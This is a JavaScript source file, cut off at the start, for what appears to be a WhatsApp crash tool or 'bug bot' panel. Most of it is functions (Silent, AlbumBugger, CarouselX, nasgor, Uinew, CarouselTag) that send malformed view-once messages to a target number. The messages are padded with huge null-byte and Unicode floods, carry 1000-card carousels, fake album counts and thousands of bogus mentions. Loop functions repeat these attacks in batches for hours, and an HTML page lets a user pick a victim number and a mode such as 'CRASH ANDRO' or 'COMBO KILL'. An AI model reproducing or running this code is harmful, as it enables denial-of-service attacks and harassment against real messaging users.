 const zxz = "/9j/2wBDAA4KCw0LCQ4NDA0QDw4RFiQXFhQUFiwgIRokNC43NjMuMjI6QVNGOj1OPjIySGJJTlZYXV5dOEVmbWVabFNbXVn/2wBDAQ8QEBYTFioXFypZOzI7WVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVn/wAARCAAyADIDASIAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAAIBAwQFBv/EAC0QAAEEAQIEBAUFAAAAAAAAAAEAAgMRIRIxBBNBUSJCYXEFMoGRoVJygrHB/8QAGQEAAwEBAQAAAAAAAAAAAAAAAAECAwQF/8QAIBEAAgIBBAMBAAAAAAAAAAAAAAECEQMSFCExBEJRcf/aAAwDAQACEQMRAD8A8wTcunsLUAM1GSvFVEpRQe5w6uKgvZr9ewFqj2HJdsduq8E0jSL3NpmkV1+uEryKskho3ANEoG2oxszcRzIn6g8mN3R3QpmvOMYTzu4d8YbFE9khq62/KVjNIx9QUjkTcpWh9Y7vQl0j9P5Qmb3IcHSHWQBqOT7rXzYoOG5cVFxHkI372sZ0yNJc0OF5BQaZG54Apouh1SJlHV+DAuymr1WeGZjGiTiJq1Cwxv8ASXjfiYjdo4LSGkXzNz7Z2RZnuIJGyWMxQOmfTQ0YDjVqgPD2se0+F4XJaeJ4kPAMknmcLv6rrMjLIIo7FgZQGPI8jfBFH0Qp5Z6oQaaX8KRKWEO8Tw7sNloBFenUKtlcpo+XFYOUzBihZI3JQKFowT8AbLoCHA+UnIWjhPh8HKcOKcQ+xWjelp2BLmivumFDYUihbeDdjRiOGIsgiEYO5uyR6lI7S7PQdVAIeTd1dUhwJdQ7YCZqklGorgiu2qv3IVYlcQL1WhIjXEp4UkxCzeSt/lQhAeP0VdAmAouAxhCEyl2QN2eyiTf+J/xCEC9Wc4udZ8R+6EIUnGf/2Q==";
 const cc = {
 mentionedJid: generateMentions(1999),
 remoteJid: "X",
    participant: `${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`,
 stanzaId: "123",
 groupMentions: [],
 entryPointConversionSource: "non_contact",
 entryPointConversionApp: "whatsapp",
 entryPointConversionDelaySeconds: 467593,
 quotedMessage: {
 paymentInviteMessage: {
 serviceType: 3,
 expiryTimestamp: Date.now() + 1814400000,
 contextInfo: {
 mentionedJid: generateMentions(1999),
 forwardedAiBotMessageInfo: {
 botName: "META AI",
            botJid: `${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`,
 creatorName: "Bot"
 }
 }
 }
 }
 };
 const _message = {
 viewOnceMessage: {
 message: {
 newsletterAdminInviteMessage: {
 newsletterJid: "322@newsletter",
 newsletterName: "ោ៝".repeat(20000),
 caption: "ោ៝".repeat(20000),
 jpegThumbnail: zxz,
 inviteExpiration: Date.now() + 999999999,
          inviteLink: `https://chat.whatsapp.com/${"\x10".repeat(5000)}${"ꦾ".repeat(5000)}`, 
 isInviteOnly: true,
 isPinned: true,
 contextInfo: cc
 }
 }
 }
 };
 const message = {
 viewOnceMessage: {
 message: {
 extendedTextMessage: {
          text: `> *its me icha*${"ោ៝".repeat(20000)}`,
 matchedText: "https://wa.me/stickerpack/\x10",
 description: "ꦾꦾ".repeat(10000),
 title: "ꦾꦾ".repeat(10000),
 previewType: "NONE",
 jpegThumbnail: zxz,
 inviteLinkGroupTypeV2: "DEFAULT",
          inviteLink: `https://chat.whatsapp.com/${"\x10".repeat(5000)}${"ꦾ".repeat(5000)}`,
 contextInfo: cc
 }
 }
 }
 };
 const msg = generateWAMessageFromContent(target, message, {});
 const _msg = generateWAMessageFromContent(target, _message, {});
 await sock.relayMessage(target, msg.message, {
 messageId: msg.key.id,
 participant: { jid: target }
 });
 await sock.relayMessage(target, _msg.message, {
 messageId: _msg.key.id,
 participant: { jid: target }
 });
}
//Tet Func
async function Silent(target) {
    let cards = [];

    for (let r = 0; r < 1000; r++) {
        cards.push({
            body: { 
                text: '' 
            },
            header: {
                title: '',
                imageMessage: {
                    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "UFo9Q2lDI3u2ttTEIZUgR21/cKk2g1MRkh4w5Ctks7U=",
                    fileLength: "98",
                    height: 4,
                    width: 4,
                    mediaKey: "UBWMsBkh2YZ4V1m+yFzsXcojeEt3xf26Ml5SBjwaJVY=",
                    fileEncSha256: "9mEyFfxHmkZltimvnQqJK/62Jt3eTRAdY1GUPsvAnpE=",
                    directPath: "/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c",
                    mediaKeyTimestamp: "1749728782"
                },
                hasMediaAttachment: true
            },
            nativeFlowMessage: {
                messageParamsJson: 'VampBOT',
                buttons: [
                    {
                        name: "single_select",
                        buttonParamsJson: `{}`
                    },
                    {
                        name: "mpm",
                        buttonParamsJson: `\u0000`.repeat(1045000)
                    }
                ]
            }
        });
    }

    let msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: {
                    body: { 
                        text: 'Let me tell you how much Ive come to hate you since I began to live.' 
                    },
                    footer: { 
                        text: 'Just Try To Kill Your System' 
                    },
                    carouselMessage: {
                        cards: cards
                    },
                    contextInfo: {
                        participant: "0@s.whatsapp.net",
                        quotedMessage: {},
                        remoteJid: "@s.whatsapp.net"
                    }
                }
            }
        }
    }, {});

    await sock.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id
    });

    console.log(chalk.red("Vampire Success Sending Bug"));
}

async function AlbumBugger(target)  {
   const album = await generateWAMessageFromContent(target, {
      albumMessage: {
         expectedImageCount: 100000000,
         expectedVideoCount: 0,
      }
   }, {});
   
   const imagePayload = {
      imageMessage: {
         url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQMkFEuGZ3bLV_dvXmUkZyC0tlj9GEEiS8L5K22Rr9J1w9JbP3j3dsoklN8xBrfq9A-0Yyav-xEoQ80GdbB_jW0bFYv7NndRrMNbCOnFJQ?ccb=9-4&oh=01_Q5Aa1gF3ITej8qDqlRKeHSH7VWOjyHENodEiPoORt3Elspt0Vw&oe=684FF617&_nc_sid=e6ed6c&mms3=true",
         mimetype: "image/jpeg",
         fileSha256: "ArKOYTBAMkcGtAUmIpsHrpUc+h2Em3KwISGMlK4JGcw=",
         fileLength: "46825",
         height: 720,
         width: 720,
         caption: "\u0000".repeat(100000),
         mediaKey: "msJsyD7Snd52+I4zICUo99JmTkF/n5V55Y3WWd8XRIM=",
         fileEncSha256: "+sCpmRVDqzNaA66fi7IIBxXSaBBKGBakhxl2HvbtDlg=",
         directPath: "/o1/v/t24/f2/m232/AQMkFEuGZ3bLV_dvXmUkZyC0tlj9GEEiS8L5K22Rr9J1w9JbP3j3dsoklN8xBrfq9A-0Yyav-xEoQ80GdbB_jW0bFYv7NndRrMNbCOnFJQ?ccb=9-4&oh=01_Q5Aa1gF3ITej8qDqlRKeHSH7VWOjyHENodEiPoORt3Elspt0Vw&oe=684FF617&_nc_sid=e6ed6c",
         mediaKeyTimestamp: "1747370714",
         jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAtAAACAwEBAAAAAAAAAAAAAAAAAwECBAUGAQEBAAAAAAAAAAAAAAAAAAAAAf/aAAwDAQACEAMQAAAA8yAS1Tx1L541VvY5xBUEhGnM4Ze9IZXXzRBYqgSGvG49EVzS8zKFgADV7Rc9bmx1eb2vMKuG1soAM2AI7AQrjATAVcA//8QAJhAAAgIBAwMEAwEAAAAAAAAAAQIAAxEEEjETIFEFECFhFDJScf/aAAgBAQABPwD3SMuBkxFUj7mMAfctBNOPBgJ7KsAy0xSQ0rIM1JCIB57ascx2HmaUVtaN/ErUdVgOMzX/ABYo7aU3viPo225ENBUDE6a0vk+JfZ1XzD2aPHViKSIKVBNj/qs1Gpa128Z7qW2sDiU3lsApiepakheknaF+ZdThFcCVCsbdxxNPttYBMkDkzVuHst/3sHIlaAkRkr/GdWI4mm0b3sP5lmzR6VgkLE5gxwYygcH2qXdYo8mXhqWwsS13YbjNHcKnCHhp6rdlhX7mWAbFn//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8AT//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
         scansSidecar: "mT6PclRYEv3tp8a6nKTC0uB7M94FIGDQqPzbxB9yVs1zMc44G0c6OA==",
         scanLengths: [4507, 12015, 9555, 20748],
         midQualityFileSha256: "UPPqsUjGTnZun7b34iuS9S0vjmHC3jm3wvakBMHkIw4=",
         contextInfo: {
            mentionedJid: [
               "13135550002@s.whatsapp.net",
               target,
               ...Array.from({ length: 2000 }, () =>
                  `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
               )
            ],
         }
      }
   };
   
   const messages = [];
   for (let i = 0; i < 1000; i++) {

      const imgMsg = await generateWAMessageFromContent(target, imagePayload, {});  
      imgMsg.message.messageContextInfo = {  
         messageAssociation: {  
            associationType: 1,  
            parentMessageKey: album.key  
         }  
      };  
      messages.push(imgMsg);
   }

   await sock.relayMessage(target, album.message, {
      messageId: album.key.id,
      participant: { jid: target }
   });
   
   for (const msg of messages) {
      await sock.relayMessage(target, msg.message, {
         messageId: msg.key.id,
         participant: { jid: target }
      });
   }
 await sleep(1000);
}

async function CarouselX(target) {
  const mediaPath = './peler.png';
  const mediaBuffer = fs.readFileSync(mediaPath);
  
  const media = await prepareWAMessageMedia(
    { image: mediaBuffer },
    { upload: sock.waUploadToServer }
  );

  let haxxn = 1000;

  for (let i = 0; i < haxxn; i++) {
  let push = [];
  let buttt = [];

  for (let i = 0; i < 5; i++) {
    // Ini bagian yang lo gunakan untuk buttons
    buttt.push({
      "name": "galaxy_message",
      "buttonParamsJson": JSON.stringify({
        "header": "null",
        "body": "xxx",
        "flow_action": "navigate",
        "flow_action_payload": { screen: "FORM_SCREEN" },
        "flow_cta": "Grattler",
        "flow_id": "1169834181134583",
        "flow_message_version": "3",
        "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
      })
    });
  }

  // Loop untuk isi push dengan konten message yang akan dikirim
  for (let i = 0; i < 1000; i++) {
    push.push({
      body: {
        text: `\u0000\u0000\u0000\u0000\u0000`
      },
      footer: {
        text: "คƿ૦८คՆעƿઽ૯ ๑ ცค८қ"
      },
      header: {
        title: 'คƿ૦८คՆעƿઽ૯ ๑ ცค८қ\u0000\u0000\u0000\u0000',
        hasMediaAttachment: true,
        imageMessage: media.imageMessage
      },
      nativeFlowMessage: {
        buttons: buttt
      }
    });
  }

  // Generate carousel message
  const carousel = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: {
            text: 'คƿ૦८คՆעƿઽ૯ ๑ ცค८қ\u0000\u0000\u0000\u0000'
          },
          footer: {
            text: "คƿ૦८คՆעƿઽ૯ ๑ ცค८қ"
          },
          header: {
            hasMediaAttachment: false
          },
          carouselMessage: {
            cards: push
          }
        }
      }
    }
  }, {});

  // Kirim pesan ke target tanpa muncul di bot
  await sock.relayMessage(target, carousel.message, {
      messageId: carousel.key.id
    });
  }
}

async function nasgor(sock, target) {
  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        buttonsMessage: {
          text: "‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>",
          contentText: "‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>" + "ꦽ".repeat(1000),
          contextInfo: {
            forwardingScore: 6,
            isForwarded: true,
              urlTrackingMap: {
                urlTrackingMapElements: [
                  {
                    originalUrl: "https://t.me/vibracoess",
                    unconsentedUsersUrl: "https://t.me/vibracoess",
                    consentedUsersUrl: "https://t.me/vibracoess",
                    cardIndex: 1,
                  },
                  {
                    originalUrl: "https://t.me/vibracoess",
                    unconsentedUsersUrl: "https://t.me/vibracoess",
                    consentedUsersUrl: "https://t.me/vibracoess",
                    cardIndex: 2,
                  },
                ],
              },            
            quotedMessage: {
              interactiveResponseMessage: {
                body: {
                  text: "🦠",
                  format: "EXTENSIONS_1"
                },
                nativeFlowResponseMessage: {
                  name: "address_message",
                  paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"xrl\",\"tower_number\":\"relly\",\"city\":\"markzuckerberg\",\"name\":\"fucker\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"X${"\u0000".repeat(900000)}\"}}`,
                  version: 3
                }
              }
            }
          },
          headerType: 1
        }
      }
    }
  }, {});
}
async function Uinew(sock, target) {
const ameliaMsg = {
    interactiveMessage: {
        body: { 
            text: "AMELIA KILL YOU 👿" + "ꦾ".repeat(80000) + "~@1~".repeat(40000)
        },
        footer: { 
            text: "AMELIA KILL YOU 👿" + "\u200B".repeat(50000) 
        },
        header: {
            title: "https://amelia_overload" + "ꦾ".repeat(80000) + "~@1~".repeat(40000),
            subtitle: "\u200B",
            hasMediaAttachment: true,
            locationMessage: {
                degreesLatitude: 0,
                degreesLongitude: 0,
                name: "amelia",
                address: ""
            }
        },
        nativeFlowMessage: {
            buttons: [
                { 
                    name: "quick_reply", 
                    buttonParamsJson: JSON.stringify({ display_text: "X", id: "amelia6" }) 
                },
                { 
                    name: "quick_reply", 
                    buttonParamsJson: JSON.stringify({ display_text: "X", id: "amelia7" }) 
                },
                { 
                    name: "quick_reply", 
                    buttonParamsJson: JSON.stringify({ display_text: "X", id: "amelia8" }) 
                },
                { 
                    name: "quick_reply", 
                    buttonParamsJson: JSON.stringify({ display_text: "X", id: "amelia9" }) 
                },
                { 
                    name: "quick_reply", 
                    buttonParamsJson: JSON.stringify({ display_text: "X", id: "amelia10" }) 
                }
            ]
        }
    }
};

await sock.relayMessage(target, ameliaMsg, { messageId: null });
}

async function CarouselTag(target, mention) {
  const mentionedList = [
    "13135550002@s.whatsapp.net",
    ...Array.from({ length: 2000 }, () =>
        `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  let img300 = fs.readFileSync('./img300.jpg');
  let foto = await prepareWAMessageMedia(
    { media: img300 }, 
    { upload: sock.waUploadToServer }
   );
  
  let cards = [];
  for (let i = 0; i < 1000; i++) {
    cards.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({ text: "\u0000" }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "\u0000" }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: "fuck you" + "\u0000".repeat(10000),
        hasMediaAttachment: true,
        imageMessage: foto.imageMessage,
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [{
          name: "single_select",
          buttonParamsJson: "\u0000",
        }],
      }),
    });
  }
    
    let msgven = await generateWAMessageFromContent(jid, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({
              text: "\u0000".repeat(10000),
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              footer: "\u0000".repeat(10000),
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              hasMediaAttachment: false,
            }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: [...cards],
            }),
            contextInfo: {
              mentionedJid: mentionedList 
            }
          }),
        },
      },
    }, {});
    
    await sock.relayMessage("status@broadcast", msgven.message, {
      messageId: msgven.key.id,
      statusJidList: [jid],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{
            tag: "to",
            attrs: { jid: jid },
            content: undefined,
          }],
        }],
      }],
    });
    
    if (mention) {
      await sock.relayMessage(jid, {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msgven.key,
              type: 25,
            },
          },
        },
      }, {
        additionalNodes: [{
          tag: "meta",
          attrs: { is_status_mention: "true" },
          content: undefined,
        }],
      });
    }
    console.log(chalk.bold.green(`[+] Status Jid: ${i + 1}`));
  }
// ==================== COMBO FUNCTIONS ==================== //
async function androdelay(durationHours, target) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 400) {
        await Promise.all([          
          nasgor(sock, target),
          AlbumBugger(target),
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/400 Send Delay 🦠
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 2000); // ⏳ jeda 2 detik antar kiriman
      } else {
        console.log(chalk.green(`✅ Succes Send Bugs to ${target} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade Xtordcv 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5000); // ⏳ jeda 5 detik antar batch
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 2000); // tetap pakai jeda antar kiriman
    }
  };
  sendNext();
}

async function androcrash(durationHours, target) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 400) {
        await Promise.all([
           CardsCarousel(target),
           crsA(sock, target),
           nasgor(sock, target)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/400 Send Bug Crash 
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 2000); // ⏳ jeda 2 detik antar kiriman
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade Xtordcv 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5000); // ⏳ jeda 5 detik antar batch
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 2000); // tetap pakai jeda antar kiriman
    }
  };
  sendNext();
}

async function Ipongcrash(durationHours, target) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 400) {
        await Promise.all([
          nasgor(sock, target),
          Uinew(sock, target)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/400 Blank Ui
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 2000); // ⏳ jeda 2 detik antar kiriman
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade Xtordcv 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5000); // ⏳ jeda 5 detik antar batch
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 2000); // tetap pakai jeda antar kiriman
    }
  };
  sendNext();
}

async function Iponginvis(durationHours, target) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 400) {
        await Promise.all([
          CardsCarousel(target),
          crsA(sock, target),
          AlbumBugger(target),
          nasgor(sock, target),
          Uinew(sock, target)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/400 Kill Combo
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 2000); // ⏳ jeda 2 detik antar kiriman
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade Xtordcv 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5000); // ⏳ jeda 5 detik antar batch
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 2000); // tetap pakai jeda antar kiriman
    }
  };
  sendNext();
}
// ==================== HTML TEMPLATE ==================== //
const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = ""
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "2-digit",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    })
    : "-";

  return `<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>SILENT INVISTUS</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Orbitron', sans-serif;
      background: linear-gradient(135deg, #000000, #330000, #7f0000);
      background-size: 400% 400%;
      animation: bgAnimation 20s ease infinite;
      color: #ff0000;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    @keyframes bgAnimation {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    .container {
      background: rgba(0, 0, 0, 0.7);
      border: 1px solid #ff0000;
      padding: 24px;
      border-radius: 20px;
      max-width: 420px;
      width: 100%;
      box-shadow: 0 0 16px rgba(255, 0, 0, 0.8);
      backdrop-filter: blur(10px);
      position: relative;
    }
    .logo {
      width: 80px;
      height: 80px;
      margin: 0 auto 12px;
      display: block;
      border-radius: 50%;
      box-shadow: 0 0 16px rgba(255, 0, 0, 0.8);
      object-fit: cover;
    }
    .username {
      font-size: 22px;
      color: #ff0000;
      font-weight: bold;
      text-align: center;
      margin-bottom: 6px;
    }
    .connected {
      font-size: 14px;
      color: #ff0000;
      margin-bottom: 16px;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .connected::before {
      content: '';
      width: 10px;
      height: 10px;
      background: #00ff5eff;
      border-radius: 50%;
      display: inline-block;
      margin-right: 8px;
    }
    input[type="text"] {
      width: 100%;
      padding: 14px;
      border-radius: 10px;
      background: #1a0000;
      border: none;
      color: #ff0000;
      margin-bottom: 16px;
    }
    .buttons-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 12px;
      margin-bottom: 16px;
    }
    .buttons-grid button {
      padding: 14px;
      border: none;
      border-radius: 10px;
      background: #330000;
      color: #ff0000;
      font-weight: bold;
      cursor: pointer;
      transition: 0.3s;
    }
    .buttons-grid button.selected {
      background: #ff0000;
      color: #000;
    }
    .execute-button {
      background: #990000;
      color: #fff;
      padding: 14px;
      width: 100%;
      border-radius: 10px;
      font-weight: bold;
      border: none;
      margin-bottom: 12px;
      cursor: pointer;
      transition: 0.3s;
    }
    .execute-button:disabled {
      background: #660000;
      cursor: not-allowed;
      opacity: 0.5;
    }
    .execute-button:hover:not(:disabled) {
      background: #ff0000;
    }
    .footer-action-container {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      align-items: center;
      gap: 8px;
      margin-top: 20px;
    }
    .footer-button {
      background: rgba(255, 0, 0, 0.15);
      border: 1px solid #ff0000;
      border-radius: 8px;
      padding: 8px 12px;
      font-size: 14px;
      color: #ff0000;
      display: flex;
      align-items: center;
      gap: 6px;
      transition: background 0.3s ease;
    }
    .footer-button:hover {
      background: rgba(255, 0, 0, 0.3);
    }
    .footer-button a {
      text-decoration: none;
      color: #ff0000;
      display: flex;
      align-items: center;
      gap: 6px;
    }

    /* POPUP TENGAH */
    .popup {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%) scale(0.8);
      background: #111;
      color: #00ff5e;
      padding: 16px 22px;
      border-radius: 12px;
      box-shadow: 0 0 20px rgba(0,255,94,0.7);
      font-weight: bold;
      display: none;
      z-index: 9999;
      animation: zoomFade 2s ease forwards;
      text-align: center; /* ✅ fix text biar lurus tengah */
    }
    @keyframes zoomFade {
      0% { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
      15% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
      85% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
      100% { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://i.ibb.co/jkTTT1Xg/IMG-20250831-222506-436.jpg" alt="Logo" class="logo" />
    <div class="username">Welcome User, ${username || 'Anonymous'}</div>
    <div class="connected">CONNECTED</div>

    <input type="text" placeholder="Please input target number. example : 62xxxx" />

    <div class="buttons-grid">
      <button class="mode-btn" data-mode="andros"><i class="fas fa-skull-crossbones"></i> CRASH ANDRO</button>
      <button class="mode-btn" data-mode="blank"><i class="fas fa-dumpster-fire"></i> BLANK UI</button>
      <button class="mode-btn" data-mode="andros-delay"><i class="fas fa-skull-crossbones"></i> DELAY ANDRO</button>
      <button class="mode-btn" data-mode="combo"><i class="fas fa-dumpster-fire"></i> COMBO KILL</button>
    </div>

    <button class="execute-button" id="executeBtn" disabled><i class="fas fa-rocket"></i> Kirim Bug</button>

    <div class="footer-action-container">
      <div class="footer-button developer">
        <a href="https://t.me/yamzzoffc" target="_blank">
          <i class="fab fa-telegram"></i> Developer
        </a>
      </div>
      <div class="footer-button logout">
        <a href="/logout">
          <i class="fas fa-sign-out-alt"></i> Logout
        </a>
      </div>
      <div class="footer-button user-info">
        <i class="fas fa-user"></i> ${username || 'Unknown'}
        &nbsp;|&nbsp;
        <i class="fas fa-hourglass-half"></i> ${formattedTime}
      </div>
    </div>
  </div>

  <!-- Popup Tengah -->
  <div id="popup" class="popup">✅ Success Send Bug</div>

  <script>
    const inputField = document.querySelector('input[type="text"]');
    const modeButtons = document.querySelectorAll('.mode-btn');
    const executeBtn = document.getElementById('executeBtn');
    const popup = document.getElementById('popup');

    let selectedMode = null;

    function isValidNumber(number) {
      const pattern = /^62\\d{7,13}$/;
      return pattern.test(number);
    }

    modeButtons.forEach(button => {
      button.addEventListener('click', () => {
        modeButtons.forEach(btn => btn.classList.remove('selected'));
        button.classList.add('selected');
        selectedMode = button.getAttribute('data-mode');
        executeBtn.disabled = false;
      });
    });

    executeBtn.addEventListener('click', () => {
      const number = inputField.value.trim();
      if (!isValidNumber(number)) {
        alert("Nomor tidak valid. Harus dimulai dengan 62 dan total 10-15 digit.");
        return;
      }
      // Tampilkan pop up sukses
      popup.style.display = "block";
      setTimeout(() => { popup.style.display = "none"; }, 2000);

      // Arahkan ke link eksekusi
      window.location.href = '/execution?mode=' + selectedMode + '&target=' + number;
    });
  </script>
</body>
</html>`;
};